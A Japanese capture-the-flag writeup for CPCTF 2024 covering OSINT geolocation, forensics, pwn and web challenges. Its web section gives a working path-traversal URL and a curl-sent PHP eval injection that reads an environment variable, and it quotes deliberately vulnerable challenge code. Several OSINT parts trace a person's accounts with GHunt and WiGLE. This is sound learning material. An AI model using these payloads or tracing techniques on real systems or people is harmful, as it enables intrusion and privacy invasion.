---
title: CPCTF 2024 Writeup
tags:
  - CTF
  - Writeup
  - CPCTF
  - Binary
  - Forensics
  - OSINT
  - Pwn
  - Shell
  - Web
date: 2024-05-05
---
## 目次
- [[#はじめに|はじめに]]
- [[#CPCTF 2024について|CPCTF 2024について]]
- [[#戦績|戦績]]
- [[#凡例|凡例]]
- [[#Binary|Binary]]
- [[#Misc|Misc]]
- [[#OSINT|OSINT]]
- [[#PPC|PPC]]
## はじめに
- ~~初めて書いたWriteupかもしれない~~(←2つ目のWriteupだった)。せっかくなので少し丁寧めに書く。
- 主にOSINT問を解いた。
## CPCTF 2024について
- スコアサーバ: https://cpctf.space/
- 開催のお知らせ: [CPCTF2024を開催します! | 東京工業大学デジタル創作同好会traP](https://trap.jp/post/2204/)
- 競技時間 (JST): 2024-04-20(土) 10:00 - 2024-04-21(日) 16:00
- 個人戦
## 戦績

| 項目  | 値       |
| --- | ------- |
| 順位  | 58/169  |
| スコア | 1120.88 |
## 凡例
- 問題名 (難易度, 正答者数, 自分の解答状況)
### 自分の解答状況

| 記号  | 意味                   |
| --- | -------------------- |
| ✔   | 解けた                  |
| 🔺  | 惜しい所まで行ったが解けなかった     |
| ❌️  | ヒントを見て解いた, または解けなかった |
| -   | その他                  |

## Binary
### [peeping](https://cpctf.space/challenges/99a53ada-d6dd-4a61-9f9d-9ae77ccaa02c) (Newbie, 79 solved, ✔)
> 僕の考えたflagを当てられますか？
> [配布ファイル](https://files.cpctf.space/peeping.zip)

とりあえず[stringsコマンド](https://ja.wikipedia.org/wiki/Strings_(UNIX))でテキストデータを表示させると, flagが出てきた。
```
$ strings files/chall
... (略)
CPCTF{b3_4_cLa1rv0yANt}
... (略)
```
<details><summary>flag</summary>

`CPCTF{b3_4_cLa1rv0yANt}`
</details>
## Crypto
###  [Substitution](https://cpctf.space/challenges/325f324c-86e4-4388-b1c4-8699c7fd58d5) (Newbie, 90 solved, ❌️)
> Cpvv muzp! Xuvdazs ijax ekrtiusknl kpqgakpx fuij xwavv nzm tniapzep. Rug'dp mpluzxiknipm pyeptiauznv neglpz nzm tpkxpdpknzep. Fkndu buk eknewazs ijp eump nzm gzvuewazs aix xpekpix! ETEIB{jpvvu_ekrtiu_cukvm}

ヒントを見た。[換字式暗号](https://ja.wikipedia.org/wiki/換字式暗号)らしい。
<details><summary>flag</summary>

`CPCTF{hello_crypto_world}`
</details>
## Forensics
### [white has much information](https://cpctf.space/challenges/840e1308-77f0-4622-a024-0d6813809293) (Easy, 60 solved, ✔)
> これがflagにつながるらしいです  
> [https://files.cpctf.space/white_has_much_information.txt](https://files.cpctf.space/white_has_much_information.txt)

問題ファイルをメモ帳などで開きマウスで選択すると空白が見える。空白といえば[Whitespace](https://ja.wikipedia.org/wiki/Whitespace)というプログラミング言語が連想されるのでその方向で進める。
ブラウザ上で動作するインタプリタ ([Whitespace Interpreter](https://naokikp.github.io/wsi/whitespace.html)) があるのでそこで実行するとflagが得られる。
## Misc
1問も解けなかった。[turning over](https://cpctf.space/challenges/db456c50-1d89-4550-b287-c66a8b1a708f)は問題ファイルをBlenderで開くとBlenderごと落ちてしまい (原因不明), flagを得られなかった。
## OSINT
### 注
- OSINT問の解法における`?`(疑問符) は, 不明瞭だったため読み取れなかった文字を表す
### [mokomoko](https://cpctf.space/challenges/a97870f0-e3c5-40bc-a773-d23844287da3) (Newbie, 97 solved, ✔)
>綺麗な風景ですね。これはどこで撮ったのでしょうか？  
>撮影場所は何らかの施設のようです。施設が用いている電話番号を CPCTF{} で囲んで解答してください。ハイフンは入れないこと。
![[mokomoko.jpeg]]

Googleレンズに画像を突っ込むと, `日立シーサイドパーク`であることが分かる。
Googleでそれを検索すると画面右側の[ナレッジパネル](https://support.google.com/knowledgepanel/answer/9163198?hl=ja)に電話番号が出てくるので, ハイフンを入れずに`CPCTF{}`で囲んで解答する。
### [omu-napo](https://cpctf.space/challenges/80ec33a4-bf4c-440f-b0bb-08f66bb46bc2) (Newbie, 36 solved, ✔)
>熱々の鉄板の上のオムナポ、美味しかった〜。  
>店舗名の英語表記をスペースを抜いた状態ものをCPCTF{}で包んだものがflagです。
>例: 店舗名が「Tokodai Cafe」の場合、flagはCPCTF{TokodaiCafe}になります。
![[omunapo.jpg]]

[IrfanView](https://www.irfanview.com)で画像を開き, メニューの`Image` -> `Information…` -> `EXIF info` -> `Show in Google Maps`を押下し, 画像に記録されている緯度経度をGoogleマップ上で表示する。
<iframe src="https://www.google.com/maps/embed?pb=!1m17!1m12!1m3!1d810.4460408786392!2d139.69965691045763!3d35.65768901360849!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m2!1m1!2zMzXCsDM5JzI3LjgiTiAxMznCsDQyJzAwLjkiRQ!5e0!3m2!1sen!2sjp!4v1713953461409!5m2!1sen!2sjp" width="400" height="300" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
ピンの先が`渋谷フクラスビル`を示しているので, Googleで`渋谷フクラスビル 洋食屋`と検索すると, 検索結果の最上部に地図とともに`純洋食とスイーツ パーラー大箸`が現れる。
その店名をGoogleで検索するとインスタの公式アカウント名が`@parlour_ohashi`であることが分かるので, 試しに`CPCTF{ParlourOhashi}`と解答すると無事正解 (だったはず。店名・flagが間違っていたらすみません)。
<details><summary>flag</summary>

`CPCTF{ParlourOhashi}`
</details>
### [Doctor yellow](https://cpctf.space/challenges/fd39237b-f240-4087-a4bd-8622d2f65fff) (Easy, 69 solved, ❌️)
>2024年の東工大の前期合格発表の翌日、河川敷を歩いていたら黄色い新幹線が走っているのを見かけました。
>これはどこで撮られた写真でしょう?
>フラグは撮影された場所の緯度と経度を10進数で表記して小数点以下3桁で切り捨てたものを順に並べたものです。  
>（例えば北緯aa.bb度 東経ccc.dd度であるとき、緯度と経度を用いて`CPCTF{aabb_cccdd}`です。）
![[doctor-yellow.jpg]]

[合格発表 | 東京工業大学　高校生・受験生向けサイト](https://admissions.titech.ac.jp/admissions/admission/admission/result)より, 写真が撮影された日は2024年3月9日であることがわかる。
撮影地を特定するためGoogleレンズで検索すると, 検索結果に多摩川が現れる。
それだけでは情報を絞れなかったので, `ドクターイエロー 目撃情報`と検索しヒットした掲示板を探すも, 東京付近かつ撮影日の目撃情報が見つからない。
ヒント2を見ると, どうやら品川駅付近らしい。
Googleマップで品川駅から東海道新幹線沿線沿いを探索すると, 画像後方のビル群等を組み合わせて[ここ](https://www.google.com/maps/place/35%C2%B034'56.9%22N+139%C2%B040'19.4%22E)周辺であることがわかる。
<details><summary>flag</summary>

flag: `CPCTF{3558_13967}`
</details>
#### 感想
### [Dokoda?](https://cpctf.space/challenges/45049446-b24f-4518-8ba8-a9514ec1ecc7) (Easy, 40 solved, ✔)
>どこで撮ったスクリーンショットだったか忘れてしまいました。  
>最寄駅のローマ字表記(全て小文字)をCPCTF{}で包んだものがflagになります。
>例: 答えが稚内駅の場合flagはCPCTF{wakkanai}となります。

画像と睨んでいても場所の情報が得られなさそうなので, 画像中の各SSID (例: `+USEN_Free_WiFi`) の下にあるMACアドレス (例: `98:2d...(略)`) を[WiGLE](https://wigle.net/)で検索する。
画面上の`View` -> `Basic Search`を開く。右側の地図で日本全体を表示して右側の`BSSID/MAC`という項目にMACアドレスを入力して`Query`ボタンを押下し検索。
地図上のピンを拡大すると, 最寄り駅が`鷺ノ宮 (Saginomiya)`であることが分かる。
<details><summary>flag</summary>

flag: `CPCTF{saginomiya}`
</details>

メモ: SSID/BSSID/ESSIDについての記事
- [無線LAN - BSSIDとESSID](https://www.infraexpert.com/study/wireless5.html)
- [無線LAN用語解説 | セキュア無線LANシステム Arubaシリーズ | 日立ソリューションズ](https://www.hitachi-solutions.co.jp/aruba/recommend-contents/word/#abc)
### [leaving](https://cpctf.space/challenges/48275778-091a-4b53-ad7e-384cf5a136c3) (Easy, 44 solved, ✔)
>電車に忘れ物をしてしまいました。事情があって、できれば駅員さんに言わずに回収したいのです。でももう数時間たっているんですよね……置きっぱなしなら嬉しいのですが。  
>スマホから今日の写真が出てきました。  
>忘れ物をしたことに気付いたのは15時ちょうどです。まだ誰にも拾われていなかったとすると、忘れ物を載せた電車が次に停まる駅はどこでしょうか。
>【解答】  
>次のフラグ形式で解答してください  
>CPCTF{駅名}  
>駅名 : 駅名のローマ字をヘボン式、全て小文字で
>【解答の例示】  
>中野(なかの)駅の場合  
>CPCTF{nakano}
![[leaving.jpeg]]

画像からわかること:
- 列車がJR東海のそれ
- 発車標のアナログ時計から, 撮影時刻が10時23分
- 発車標から, `普通 (当駅始発) 10:25発 熱海行き 3両`
- 発車標の奥に`新幹線のりかえ`から, 新幹線の駅がある
Googleレンズに画像を投げると, `浜松駅`がヒットする。浜松駅は東海道新幹線の停車駅であるので東海道本線浜松駅で撮影されたと仮定する。
[東海道線上り(浜松→熱海)運用表](https://tokaido-unyo-shizuoka.com/unyo/202403/tokaido-202403-up.html)の中から10:25浜松発の熱海行き列車を探すと列車番号`450M`が見つかり, 熱海着が`13:04`である事がわかる。
熱海から折り返すと仮定して, [東海道線下り(熱海→浜松)運用表](https://tokaido-unyo-shizuoka.com/unyo/202403/tokaido-202403-down.html)の中から13:04以降発の列車を探すと, 列車番号`455M`熱海13:14発豊橋行きが見つかる。
[Yahoo!路線情報](https://transit.yahoo.co.jp/)の乗換案内で`熱海から豊橋, 13:14出発 新幹線無し`を指定して検索すると[検索結果](https://yahoo.jp/6_irZF)より, 15:00以降に初めて停車する駅は15:02着の`金谷 (かなや)`であることが分かる。
<details><summary>flag</summary>

`CPCTF{kanaya}`
</details>
### [Forbidden Code 1](https://cpctf.space/challenges/44def5ae-b8f1-415b-8d37-dfff04b4ed2e) (Medium, 28 solved, 🔺)
注: **メールアドレスのローカルパートは省略**
>私の友達が、怪しい発信をしているという噂を聞いた。その真相が知りたいため、手伝ってほしい。  
>ひとまず、彼の持っているアカウントを調べ上げてほしい。  
>彼のメールアドレスは、`@gmail.com` だ。

与えられたメールアドレスがGmailアドレスなので, [GHunt](https://github.com/mxrch/GHunt)を使用して調べてみる。
```
$ ghunt @gmail.com
... (略)
🗓️ Calendar data
[+] Public Google Calendar found !
... (略)
🗃️ Download link :
=> https://calendar.google.com/calendar/ical/@gmail.com/public/basic.ics
```
どうやらPublicなGoogleカレンダーが存在するらしいので, `Download Link`にアクセスしicsファイルをダウンロードしてメモ帳等で開く。
```
BEGIN:VCALENDAR
PRODID:-//Google Inc//Google Calendar 70.9054//EN
VERSION:2.0
... (略)
DESCRIPTION:please contact me: \ngmail: @gmail.com\nX : myaomyaohi
 t
... (略)
DESCRIPTION:my favorite CTF event!!!!!!\n I got a leak of part of the flag:
  CPCTF{Did_Y0u_3\nKeep it a secret!!!! :D
... (略)
```
2つ存在する`DESCRIPTION`の内, 前者の方にXのアカウント名らしきもの (`myaomyaohit`) が書かれている。後者の方には, flagの一部 (`CPCTF{Did_Y0u_3`) が書かれている。
Xで`@myaomyaohit`のユーザページを開くと以下の物が見つかる:
- bioにフラグの一部 (`nj0y_tH3_5N5_5u`)
- pastebinのURL (https://pastebin.com/C9eUeuQe) を含むツイート
- `It's not safe to post it here. I'll post it somewhere else.`というツイート
`I'll post it somewhere else`とあるので, Googleで`myaomyaohit`を検索してみると[Redditのユーザページ](https://www.reddit.com/user/myaomyaohit/)がヒット。ページ右側にあるbioにflagの一部 (`rV3y?_1df1aa3r}`) が書かれている…**ことに気が付かず**, ページ中央に書かれているRSA暗号に目が行ってしまい解けなかった。どうやらRSA暗号は, 当問題の続きの問題である[Forbidden code 2](https://cpctf.space/challenges/f6b35e5b-fd42-4927-a6aa-3912824da2e1)に関係するものらしい。
<details><summary>flag</summary>

`CPCTF{Did_Y0u_3nj0y_tH3_5N5_5urV3y?_1df1aa3r}`
</details>
### [Great view](https://cpctf.space/challenges/acfb7245-eabd-4985-8d7a-5c2f54a12624) (Medium, 50 solved, ❌️)
>とても見晴らしが良い場所に来ました！  
>ところで、この場所はあるゲームアプリの中でも登場したようです。  
>そのアプリが正式リリースされた日時を教えてください。
>ただし、次のフラグ形式で解答してください: CPCTF{YYYY_MM_DD_hh_mm}  
>（全て半角数字です。月日、時、分は必要なら先頭に'0'を付けて2桁で回答してください。タイムゾーンはJSTです。24時制で表記してください。）  
>例（2024年4月21日 16時00分 の場合）: CPCTF{2024_04_21_16_00}
![[great_view.jpg]]

Googleレンズに突っ込むと`卯辰山公園見晴らし台`で撮影された写真であるとわかる。
`卯辰山公園見晴らし台 ゲーム`と調べると`Link！Like！ラブライブ！`というゲームで登場することがわかる。
`Link！Like！ラブライブ！`と調べると, 2023/05/20に正式リリースであるという記載は複数見つかるが, 肝心の時刻が見つからない。
ここで, 公式Twitterアカウント ([@hasunosora_SIC](https://twitter.com/hasunosora_SIC)) を調べてみる。
2023/05/20までのツイートを見たいので, Twitterで`from:hasunosora_SIC until:2023-05-20`と検索する。
そうして現れる[この投稿](https://twitter.com/hasunosora_SIC/status/1659584614762164225)より18時頃予定であることがわかるが, 18時何分なのかがわからない。18:00だと仮定して答えたがハズレ。お手上げだ。

Writeupを書くにあたってヒントを全部開けた。ヒント曰く`from:hasunosora_SIC until:2023-05-21`と調べると良いらしい。**え？**
試しに調べると, [この投稿](https://twitter.com/hasunosora_SIC/status/1659906627452145667)と[この投稿](https://twitter.com/hasunosora_SIC/status/1659929689182605312)より, 23:30ということがわかった。
一体なぜ until:2023-05-**20** でこれらの投稿が引っかからなかったのだろうか。
どうやら, untilで指定する時間は**UTC** (協定世界時)として扱われ, JST (日本時間) として扱わせるには`2023-05-20_23:59:59_JST`などという風にする必要があるらしい。
<details><summary>flag</summary>

`CPCTF{2023_05_20_23_30}`
</details>
#### 感想
- `05-20`で駄目だったのなら次の日である`05-21`も試せば良かった。流石にUTC・JSTのことは頭に微塵も無かった。
### [Patlite](https://cpctf.space/challenges/7fceae11-7fcf-4b27-8269-65d45829c368) (Medium, 38 solved, ✔)
> どこで撮影されたものか北緯と東経を小数4位を四捨五入して、以下の形式で変換して提出してください。  
> 北緯30.4445度、東経138.8882の場合、CPCTF{30-445_138-888}となります。
![[patlite.jpg]]

画像からわかること:
- `?06 渋谷駅`の方向幕を表示するバス
  - `?06`は系統名, `渋谷駅`は行先であると仮定
- 車ゆりかもめと都営バス
`東京都 バス 渋谷駅行き 06`をGoogle検索すると, 都営バスの`都06`系統であることが分かる。
[都バス 都０６ 系統運行状況 ｜ 都バス運行情報サービス ｜ 東京都交通局](https://tobus.jp/blsys/navi?LCD=&VCD=cslrsi&ECD=NEXT&RTMCD=31)より, 都06系統は`新橋駅前`から`渋谷駅前`までを結ぶことが分かる&ゆりかもめが新橋駅を通っていることから, 新橋駅前周辺をGoogleストリートビューで閲覧。画像左半分のシャッターと画像右側にある緑の看板を目印にして撮影場所を探すと, 緯度経度`35.6657, 139.7589`あたりが適切そうである。
<iframe src="https://www.google.com/maps/embed?pb=!1m17!1m12!1m3!1d810.3635967764121!2d139.7589839067459!3d35.66581210469615!2m3!1f0!2f0!3f0!3m2!1i1024!2i768!4f13.1!3m2!1m1!2zMzXCsDM5JzU2LjciTiAxMznCsDQ1JzMyLjQiRQ!5e0!3m2!1sen!2sjp!4v1713962412639!5m2!1sen!2sjp" width="400" height="300" style="border:0;" allowfullscreen="" loading="lazy" referrerpolicy="no-referrer-when-downgrade"></iframe>
<details><summary>flag</summary>

`CPCTF{35-556_139-759}`
</details>
### [Passing](https://cpctf.space/challenges/040cf841-7bb1-4e7f-87b0-98bf134d9292) (Hard, 12 solved, 🔺)
> YouTubeに投稿された動画の撮影場所と撮影日時を特定してください。  
> [https://youtu.be/A1cnWeUiitk](https://youtu.be/A1cnWeUiitk)
> 【解答】  
> 次のフラグ形式で解答してください  
> CPCTF{駅名_撮影日_時間}  
> 駅名 : 駅名のローマ字をヘボン式、全て小文字で  
> 撮影日 : YYYYMMDD  
> 時間 : 24時間表記(時+分)で、コロンは取る。また、分数の1の位は切り捨てて0とする。
> 【解答の例示】  
> 中野(なかの)駅で2024年4月20日 10時34分に撮影している場合  
> CPCTF{nakano_20240420_1030}
<iframe width="560" height="315" src="https://www.youtube-nocookie.com/embed/A1cnWeUiitk?si=pUu0dy10t-R8FvAO" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

#### 動画からわかること (画質設定を`1080p60`に変更することを推奨):
- 列車がJR東海のそれ (2回目) (列車下に記載の系を見て調べれば分かる)
- 画面中央の案内標を目をよく凝らして見ると, `中?天? ??方面`と書かれている
- 駅のプラットホームの形式が[島式](https://ja.wikipedia.org/wiki/プラットホーム#島式ホーム)
- [18秒](https://youtu.be/A1cnWeUiitk?t=18)あたりに, `天竜峡`と表示された方向幕が映る (後で気がついた)
#### 撮影場所
雰囲気から鑑みて, 飯田線・身延線・御殿場線辺りに目星を付ける。
[JR東海の路線図](https://railway.jr-central.co.jp/route-map/)を見る。`中?天?`という名前の駅を探すと, `中部天竜`という駅が飯田線内で見つかる。
YouTubeで[飯田線の前面展望動画](https://www.youtube.com/watch?v=rVv5bUEg88Q)を観る。島式ホーム以外をひたすら飛ばしていくと, 1:26:57あたりの`三河槙原駅`が問題の動画と似ている。
Googleマップで見てみると明らかに問題の動画と景色が一致。
### 撮影時刻
[三河槙原駅(ＪＲ飯田線 中部天竜・天竜峡方面)の時刻表 - Yahoo!路線情報](https://transit.yahoo.co.jp/timetable/25194/1311)の`中部天竜・天竜峡方面`より, 三河槙原を発車する天竜峡行きの列車は平日・土日祝共通で以下の4本があることがわかる:
- 07:07
- 09:43
- 14:54
- 20:07
さらに, 問題の動画の空の明るさより明らかに`20:07`は除外できるので候補は3本に絞られる。
#### 撮影日
問題の動画と同じ投稿者の別の動画 ([車窓](https://www.youtube.com/watch?v=dJI7SWkMp6s)) の概要欄にXへのリンク ([@ichikami412657](https://twitter.com/ichikami412657)) があった。
フォロー中とフォロワーの両方に[@tym10926datera](twitter.com/tym10926datera)というアカウントが居るが, 鍵垢なので情報が得られない。
 撮影場所と撮影時刻はおおよそ明らかになったが, 肝心の撮影日がわからない。解けそうになかったが, ヒントを開けたくなかったのでお手上げ。一応2024年3月~4月あたりを答えたがハズレ。

Writeupを書くにあたって, ヒントを全て開けた。どうやらインスタグラム上に例の鍵垢と同じIDのアカウントがあり, そこから撮影日を特定するらしい。
#### 感想
- 天竜峡行きを表示する方向幕を最初に見ておけば路線が早く確定した
- 動画の一部分をスクリーンショットしてGoogleレンズに投げれば駅が早く確定した
- ユーザー名をググればよかった
## PPC
### [About half](https://cpctf.space/challenges/228df12e-50ce-4608-a08e-4a8a8c6e706f) (Newbie, 92 solved, ✔)
<https://yukicoder.me/problems/10842>
> 飴が全部で$A+B$個あって、Aliceに $A$ 個、Bobに $B$ 個分けました。  
> AliceとBobは、相手の持っている飴の個数が、自分の持っている飴の個数の $2$ 倍より大きいとき、分け方に文句を言います。  
> この分け方にAliceもBobも文句を言わないかどうか判定をしてください。

つまり, A>2BまたはB>2Aならば文句を言い, そうでない場合は文句を言わない。
```python
A, B = map(int, input().split())
if A > B*2 or B > A*2:
	print("No")
else:
	print("Yes")
```
<details><summary>flag</summary>

`CPCTF{n07_h41f}`
</details>
### [Compound Word](https://cpctf.space/challenges/4803e91a-15c9-4e29-bed3-398b02f96cc4) (Newbie, 72 solved, ✔)
<https://yukicoder.me/problems/10834>
> $N$個の文字列 $S_1​, S_2​, ⋯, S_N$​ が与えられる。  
> これらの文字列のうち、異なる二つの文字列 $S_i$​, $S_j$​ を選び、$S_i​S_j$​ の順につなげた文字列を $T$ をします。  
> この時、$T$ としてあり得る文字列は何通りあるか求めてください。

1. 文字列をつなげる
2. それが既出だった場合 (リストに含まれている場合) はスキップする
3. そうでない場合はリストに追加する
4. 全パターンを試し終わるまで, 1~3を繰り返す
5. リストの長さを出力する
```python
N = int(input())
S = []
T = []
for _ in range(N):
	S.append(input())
for i, s_a in enumerate(S):
	for k, s_b in enumerate(S):
		if i == k:
			continue
		if s_a+s_b not in T:
			T.append(s_a+s_b)

print(len(T))
```
<details><summary>flag</summary>

`CPCTF{Set_is_Useful_ki70v9354v7onymw}`
</details>
## Pwn
### [Attack! Attack! Win!](https://cpctf.space/challenges/cf8bf675-d669-4729-ac6e-885f3f66b368) (Newbie, 80 solved, ❌️)
> flagを盗まれてしまいました……  
> 敵を倒して取り返してきてもらえませんか？  
> `nc attack_attack_win.web.cpctf.space 30005`
> [配布ファイル](https://files.cpctf.space/attack_attack_win.zip)

ヒントを見て言われるがままに`-2`を入力した。
<details><summary>flag</summary>

`CPCTF{4_c1eVeR_4nd_p4CifI5t_7hi3F}`
</details>
### [CPCT......](https://cpctf.space/challenges/27539983-608e-4320-9fe4-50954352832d) (Easy, 61 solved, ❌️)
> 等価交換って良いですよね。ということで、入力した文字数の分だけflagをあげます！  
> でも貰いすぎても困るので4文字以内でお願いします……  
> `nc cpct.web.cpctf.space 30006`
> [配布ファイル](https://files.cpctf.space/cpct.zip)

入力した文字数の文だけflagが貰えるプログラム。
長い文字列を入力しても4文字以内でないとflagが貰えない。
見当がつかなかったのでヒントをすべて開けた。39行目の`length = printf(buf);`が脆弱らしい ([Format String Bug](https://ptr-yudai.hatenablog.com/entry/2018/10/06/234120))。書かれている通り`%99c`と入力してflagを入手。
調べた結果, `%`と`c`の間に数字を入れれば全体幅がその数値になるように調整されて出力されるということがわかった。(参考: [フォーマット指定子一覧](https://www.k-cube.co.jp/wakaba/server/format.html))
`files/chall.c`
```c:files/chall.c
// ...(略)
	printf("Thank you!\nYour input:");
	length = printf(buf);
	printf("\n");
	printf("Length: %d\n", length);
// ...(略)
```
<details><summary>flag</summary>

`CPCTF{1m_50rrY_bu7_i_Hav3_0nLy_45_ch4raCteRs}`
</details>
## Shell
### [netcat](https://cpctf.space/challenges/261fb92f-a2af-4ae5-b0c4-b6d12d145325) (Newbie, 101 solved, ✔)
> 次のアドレスに接続するとフラグが貰えます！
> domain: shell-netcat.web.cpctf.space
> port: 30010

問題名通り, [netcat](https://ja.wikipedia.org/wiki/Netcat)を使う。
```text
$ nc shell-netcat.web.cpctf.space 30010
CPCTF{nc_means_netcat}
```
### [veeeeeeery long text](https://cpctf.space/challenges/1c53286d-d140-48e8-8a53-e46dcb7bff38) (Easy, 66 solved, -)
Writeupを書いている時に存在に気がついた問題。競技中完全に見落としていた。
`grep`コマンドを使用して`flag.txt`からflagを探す。
```text
$ cat flag.txt | grep CPCTF
CPCTF{p1pe_15_u5efu1}FjmZDU+#_w0Dp@tnD]>MvLEDo\.P;nq0::qM1&V7*~X
```
<details><summary>flag</summary>

`CPCTF{p1pe_15_u5efu1}`
</details>
## Web
### [Typing game](https://cpctf.space/challenges/bc44eeeb-74dc-41b5-83a2-3960f27aa90e) (Newbie, 124 solved, ✔)
> 面白そうなタイピングゲームを見つけたぞ！早速やってみよう♪  
> ...なんかムズくない？？？？？  
> 問題サイト：[https://typing-game.web.cpctf.space/](https://typing-game.web.cpctf.space/)

ブラウザ上で`Ctrl`+`U`を押下してページのソースを確認すると, `main.js`というファイルが見つかるのでアクセスすると最終行にflagが見つかる。
<details><summary>flag</summary>

`CPCTF{y0u_4r3_4_typ1ng_m45t3r}`
</details>
### [Read Novels](https://cpctf.space/challenges/ee1fab2a-1f89-4db8-ad7e-5c98916aaa93) (Easy, 87 solved, ✔)
> 小説が読めるサイトを見つけたぞ！  
> これ小説以外も見れるじゃん...  
> サイト：[https://read-novels.web.cpctf.space](https://read-novels.web.cpctf.space)  
> 配布ファイル：[https://files.cpctf.space/read-novels.zip](https://files.cpctf.space/read-novels.zip)

`配布ファイルのディレクトリ構造`
```text
$ tree Read_Novels-main
Read_Novels-main/
├── app.py
├── flag
├── novel
│   ├── mon
│   ├── sanshiro
│   └── sorekara
└── templates
    ├── index.html
    └── novel.html
```
`app.py`
```python:app.py
# ...(略)
@app.route('/novel', methods=['GET'])
def novel():
    name = request.args.get('name')
    filepath = './novel/' + name
    if os.path.exists(filepath) == False:
        return "File not found"
    if os.path.isfile(filepath) == False:
        return "Not a file"
    body = open(filepath, 'r').read()
    return render_template('novel.html', title=name, body=body)
# ...(略)
```
`./novel/`と GETの`name`パラメータで指定された文字列を繋げたものをパスとして開くという処理をしていることが分かる。
ファイルのパスを投げればそのファイルの中身を返してくれそうなので, [パストラバーサル](https://www.ipa.go.jp/security/vuln/websecurity/parameter.html)で`flag`ファイルを開かせる。
`filepath`を`./novel/../flag`にしたいから, `https://read-novels.web.cpctf.space/novel?name=../flag`にアクセスしてflagを入手。
<details><summary>flag</summary>

`CPCTF{P4th_tr4v3rs41_15_v3ry_d4ng3r0u5}`
</details>
### [Let's buy some array](https://cpctf.space/challenges/c4307b31-81f0-40b2-9be3-2b73dca9a95a) (Easy, 67 solved, ✔)
> 贔屓にしている数列屋さんがモバイルオーダーに対応したらしい。とは言っても金額計算機能しかないらしいけど。  
> ...この金額計算、あんまり安全じゃなくないか？  
> 問題サーバー：[https://lets-buy-some-array.web.cpctf.space/](https://lets-buy-some-array.web.cpctf.space/)  
> 配布ファイル：[https://files.cpctf.space/lets-buy-some-array.zip](https://files.cpctf.space/lets-buy-some-array.zip)

`Dockerfile`
```dockerfile:Dockerfile
FROM php:8.3-apache
COPY ./src/ /var/www/html

ENV FLAG=CPCTF{dummy_flag}
EXPOSE 80
```
`array/src/purchase.php`
```php:array/src/purchase.php
// ...(略)
        <form action="purchase.php" method="post">
            <table>
                <tr>
                    <th>商品名</th>
                    <th>単価</th>
                    <th>個数</th>
                    <th>小計</th>
                </tr>
                <tr>
                    <td>フィボナッチ数列</td>
                    <td>1000</td>
                    <td><?=$_POST["quantity1"]?></td>
                    <td><?=eval('return ' . $_POST["quantity1"] . '*1000;')?></td>
                </tr>
                <tr>
                    <td>素数列</td>
                    <td>2000</td>
                    <td><?=$_POST["quantity2"]?></td>
                    <td><?=eval('return ' . $_POST["quantity2"] . '*2000;')?></td>

                </tr>
                <tr>
                    <td>三角数列</td>
                    <td>1500</td>
                    <td><?=$_POST["quantity3"]?></td>
                    <td><?=eval('return ' . $_POST["quantity3"] . '*1500;')?></td>
                </tr>
            </table>
            <p>合計金額は<?=eval('return ' . $_POST["quantity1"] . '*1000+' . $_POST["quantity2"] . '*2000+' . $_POST["quantity3"] . '*1500;')?>円です。この画面を実店舗の店員にご提示ください。</p>
```
わかること:
- 環境変数`FLAG`にflagが保管されている
- `quantity1`・`quantity2`・`quantity3` の中身が, 引数としてeval関数に渡されている
よって, 環境変数を取得するコードをquantity1, quantity2, quantity3のいずれかに入れて実行すればflagを取得できそうである。
`PHP 環境変数 取得`などと検索すると, [getenv](https://www.php.net/manual/ja/function.getenv.php)と[$\_ENV](https://www.php.net/manual/ja/reserved.variables.environment.php)がヒットする。
今回は, `quantity1`に, 環境変数を取得する, `getenv`を使用したコードを入れる。
単純に以下のデータを入れて実行しても, エラーが吐かれてしまってflagを得られない:

| 要素        | 中身                 |
| --------- | ------------------ |
| quantity1 | getenv("FLAG")<br> |
| quantity2 | 1                  |
| quantity3 | 1                  |
**実行結果**
```text
$ curl -X POST -d 'quantity1=getenv("FLAG")&quantity2=1&quantity3=1' https://lets-buy-some-array.web.cpctf.space/purchase.php
...(略)
<b>Fatal error</b>:  Uncaught TypeError: Unsupported operand types: string * int in /var/www/html/purchase.php(20) : eval()'d code:1
Stack trace:
#0 /var/www/html/purchase.php(20): eval()
#1 {main}
  thrown in <b>/var/www/html/purchase.php(20) : eval()'d code</b> on line <b>1</b><br />
```
ここで, 当該のeval関数は以下のようになっているから, 
```php
eval('return ' . $_POST["quantity1"] . '*1000+' . $_POST["quantity2"] . '*2000+' . $_POST["quantity3"] . '*1500;')
```
quantity1に`getenv("FLAG")`を入れると:
```php
eval('return ' . 'getenv("FLAG")' . '*1000+' . $_POST["quantity2"] . '*2000+' . $_POST["quantity3"] . '*1500;')
```
 "." (ドット) は文字列結合の意味であると推測して ([実際にそういう意味である](https://www.php.net/manual/ja/language.operators.string.php)):
```php
eval('return getenv("FLAG") *1000+1*2000+1*1500;')
```
となり, 文字列 (`getenv("FLAG")`) と数値 (`1000`) 同士の演算になってしまうからエラーが吐かれたのだと推測できる。
これを回避するために, `getenv("FLAG")`より後の文字列が実行されないようにする。具体的には, `;`で文を終わらせ, `//`で以降の文字列をコメント化する。
よって, quantity1に`getenv("FLAG")`ではなく`getenv("FLAG");//`を入れるように変えて実行すれば良い。
```text
$ curl -X POST -d 'quantity1=getenv("FLAG");//&quantity2=1&quantity3=1' https://lets-buy-some-array.web.cpctf.space/purchase.php
...(略)
            </table>
            <p>合計金額はCPCTF{3x3c_Func710n_1s_d4ng3r0u5}円です。この画面を実店舗の店員にご提示ください。</p>
        </form>
    </body>
</html>
```
<details><summary>flag</summary>

`CPCTF{3x3c_Func710n_1s_d4ng3r0u5}`
</details>
## 振り返り
- OSINTが面白かった
	- Geoguessr要素に加えて, 得られる情報から条件を仮定して調査する部分が主に
- 問題自体の見落としが無いようにしたい
- PPCがNewbie以外全く解けなかったので競プロも学びたい